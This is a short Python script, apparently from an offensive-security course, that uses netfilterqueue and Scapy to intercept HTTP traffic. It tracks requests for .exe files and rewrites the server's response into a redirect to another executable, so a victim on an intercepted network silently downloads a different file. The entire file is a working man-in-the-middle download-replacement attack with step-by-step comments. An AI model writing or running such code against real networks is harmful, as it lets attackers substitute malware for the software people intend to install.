import netfilterqueue  # Import the netfilterqueue library for interfacing with Netfilter queues in Linux
import scapy.all as scapy  # Import all functions from Scapy for packet manipulation

ack_list = []  # Initialize an empty list to keep track of ACK numbers of packets requesting .exe files

def process_packet(packet):
    """
    Process packets from the Netfilter queue.
    :param packet: The packet to process.
    """
    scapy_packet = scapy.IP(packet.get_payload())  # Convert the raw packet to a Scapy packet

    # Check if the packet has a Raw layer (contains payload data)
    if scapy_packet.haslayer(scapy.Raw):
        # Check if the packet is an HTTP request (destination port 80)
        if scapy_packet[scapy.TCP].dport == 80:
            # Check if the payload contains a request for an .exe file
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                # Add the ACK number to the ack_list
                ack_list.append(scapy_packet[scapy.TCP].ack)
        
        # Check if the packet is an HTTP response (source port 80)
        elif scapy_packet[scapy.TCP].sport == 80:
            # Check if the sequence number is in the ack_list
            if scapy_packet[scapy.TCP].seq in ack_list:
                # Remove the sequence number from the ack_list
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # Modify the packet payload to redirect to a different URL
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar56b1.exe\n\n"
                # Delete the length and checksum fields to force recalculation
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                
                # Set the modified packet as the new payload
                packet.set_payload(bytes(scapy_packet))
    
    packet.accept()  # Accept the packet and continue processing

queue = netfilterqueue.NetfilterQueue()  # Create an instance of NetfilterQueue
queue.bind(0, process_packet)  # Bind the queue to queue number 0 and specify the callback function
queue.run()  # Start the queue and begin processing packets
